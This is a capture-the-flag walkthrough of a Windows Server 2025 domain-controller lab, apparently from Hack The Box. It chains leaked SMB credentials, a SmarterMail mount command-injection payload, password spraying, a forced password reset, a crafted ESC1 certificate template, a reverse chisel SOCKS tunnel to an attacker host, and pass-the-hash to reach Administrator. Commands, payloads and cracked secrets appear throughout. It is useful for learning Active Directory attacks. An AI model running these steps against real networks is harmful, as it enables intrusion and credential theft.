# DanglingTree

**OS:** Windows Server 2025 (AD DC)  
**Domain:** danglingtree.htb  
**DC:** dc.danglingtree.htb

Credentials from SMB: `anderson.w:R3dT3am@Acc3ss#01`

---

# Enumeration

## Nmap

```
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc         [filtered externally]
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  ssl/ldap
3268/tcp  open  globalcatLDAP
5985/tcp  open  winrm
6600/tcp  open  Windows Admin Center
17017/tcp open  SmarterMail HTTP API
```

## SMB

```bash
nxc smb 10.129.130.6 --shares -u '' -p ''
```

Anonymous access on `IT\Security`. Contains a PDF internal security report with plaintext creds:

```
anderson.w : R3dT3am@Acc3ss#01
```

---

# Foothold: Windows Admin Center (port 6600)

WAC exposes a PowerShell execution endpoint. After authenticating, the `/api/nodes/dc.danglingtree.htb/features/powershellApi/invokeCommand` endpoint runs arbitrary PowerShell as the logged-in user.

Login requires: CSRF token from the landing page + RSA-OAEP-256 encrypted credentials (public key fetched from `/api/user/key`).

```python
# Fetch CSRF and JWK public key, encrypt creds, POST to /api/user/login,
# then POST PowerShell to /api/nodes/dc.danglingtree.htb/features/powershellApi/invokeCommand
```

Shell as `DANGLINGTREE\anderson.w`.

---

# anderson.w -> svc_mail (CVE-2026-23760)

Local enumeration from WAC shows SmarterMail on `127.0.0.1:17017`. Found credentials in SmarterMail config on disk: `svc_mail:Pwn3d!2026#Adm`.

CVE-2026-23760: the volume mount API executes the `commandMount` field as a shell command on mount.

```bash
# Authenticate
POST /api/v1/auth/authenticate-user
{"username":"svc_mail","password":"Pwn3d!2026#Adm"}

# Execute command
POST /api/v1/settings/sysadmin/mount-selected
{
  "mountPath": "C:\\xpoc",
  "commandMount": "cmd /c whoami > C:\\ProgramData\\out.txt",
  "commandUnmount": "",
  "enabled": true,
  "readOnly": false,
  "useArgumentsInCommand": false
}
```

Code execution as `DANGLINGTREE\svc_mail`.

---

# alex.o and the AD PKI chain

## Password spray -> alex.o

```bash
nxc smb 10.129.130.6 -u users.txt -p passwords.txt --continue-on-success
```

Valid: `alex.o:SunsetMountainPeak@2025`

## BloodHound as alex.o

```bash
python3 -m bloodhound --use-ldaps -ns 10.129.130.6 \
  -d danglingtree.htb -u alex.o -p 'SunsetMountainPeak@2025' -c All --zip
```

Key finding: `support-it` has `ForceChangePassword` on `jake.h`. alex.o is a member of `support-it`.

## Force-reset jake.h

```bash
rpcclient -U "danglingtree.htb/alex.o%SunsetMountainPeak@2025" 10.129.130.6 \
  -c "setuserinfo2 jake.h 23 'H4ck3r@PKI!2026'"
```

---

# jake.h -> Administrator (AD CS ESC1)

## jake.h group memberships

- `Template_Editors` - CREATE_CHILD on `CN=Certificate Templates`
- `Helpdesk_Cert_Support` - ManageCertificates (Officer) on `danglingtree-DC-CA`
- `DevOps_PKI` - WinRM/RDP access

## Create vulnerable certificate template

`Template_Editors` lets jake.h create new certificate template objects in AD. Using ldap3 over LDAPS (port 636):

```python
conn.add(
    'CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,...',
    objectClass=['top', 'pKICertificateTemplate'],
    attributes={
        'msPKI-Certificate-Name-Flag': 1,   # ENROLLEE_SUPPLIES_SUBJECT
        'msPKI-Enrollment-Flag': 0,
        'pKIExtendedKeyUsage': ['1.3.6.1.5.5.7.3.2'],  # Client Authentication
        'msPKI-Template-Schema-Version': 2,
        ...
    }
)
```

Then grant enrollment rights via dacledit + certipy-ad, and add the template to the CA's `certificateTemplates` list.

## Windows Server 2025: StrongCertificateBindingEnforcement

Requesting a cert and using it for PKINIT fails:

```
[-] Object SID mismatch between certificate and user 'administrator'
```

Windows Server 2025 enforces that the certificate contains the user's SID in extension OID `1.3.6.1.4.1.311.25.2`. Without it, the KDC rejects the AS-REQ.

certipy-ad's `-sid` parameter embeds this extension in the certificate request, and the CA includes it in the issued cert. The catch: certipy-ad req uses RPC over SMB (`ncacn_np:\pipe\cert`, port 445) which requires reaching the CA's RPC stack. Port 135 (endpoint mapper) is filtered externally, but port 445 is open.

## SOCKS tunnel via chisel

Transfer chisel to the DC using the SmarterMail mount RCE:

```bash
# Serve chisel from Kali
python3 -m http.server 8888

# On Kali - start reverse SOCKS server
./chisel server --port 4444 --reverse --socks5

# On DC via SmarterMail mount RCE
C:\ProgramData\chisel.exe client 10.10.15.95:4444 R:socks
```

SOCKS5 proxy now on `127.0.0.1:1080`. All traffic routed through the DC - so `10.129.130.6:445` resolves as a loopback connection on the DC itself.

## Request cert with SID extension

```bash
proxychains4 certipy-ad req \
  -u 'jake.h@danglingtree.htb' -p 'H4ck3r@PKI!2026' \
  -ca 'danglingtree-DC-CA' -template EmployeeAuthTemplate \
  -upn 'administrator@danglingtree.htb' \
  -sid 'S-1-5-21-4220238332-57023728-1129110646-500' \
  -dc-ip 10.129.130.6 -target 10.129.130.6 \
  -out administrator.pfx
```

```
[*] Successfully requested certificate
[+] Found SID in security extension: 'S-1-5-21-4220238332-57023728-1129110646-500'
[*] Wrote certificate and private key to 'administrator.pfx'
```

---

# Root

## PKINIT -> NT hash

```bash
certipy-ad auth -pfx administrator.pfx \
  -username administrator -domain danglingtree.htb -dc-ip 10.129.130.6
```

```
[*] Got hash for 'administrator@danglingtree.htb': aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925
```

## Flags

```bash
wmiexec.py -hashes :8cacb3a97e460c65d105ca7cd9913925 Administrator@10.129.130.6 \
  'type C:\Users\noah.b\Desktop\user.txt'
# [REDACTED]

wmiexec.py -hashes :8cacb3a97e460c65d105ca7cd9913925 Administrator@10.129.130.6 \
  'type C:\Users\Administrator\Desktop\root.txt'
# [REDACTED]
```

---

# Chain

```
SMB (PDF) -> anderson.w
  WAC PS exec -> svc_mail (CVE-2026-23760 mount RCE)
    password spray -> alex.o
      ForceChangePassword (support-it ACE) -> jake.h
        LDAP template creation (Template_Editors) -> EmployeeAuthTemplate (ESC1)
        Helpdesk_Cert_Support (ManageCertificates on CA)
        chisel SOCKS via SmarterMail RCE (bypass port 135 filter)
          certipy-ad req -sid (ESC1 + WS2025 SID binding bypass)
            PKINIT -> Administrator NT hash
              wmiexec PTH -> root.txt + user.txt
```
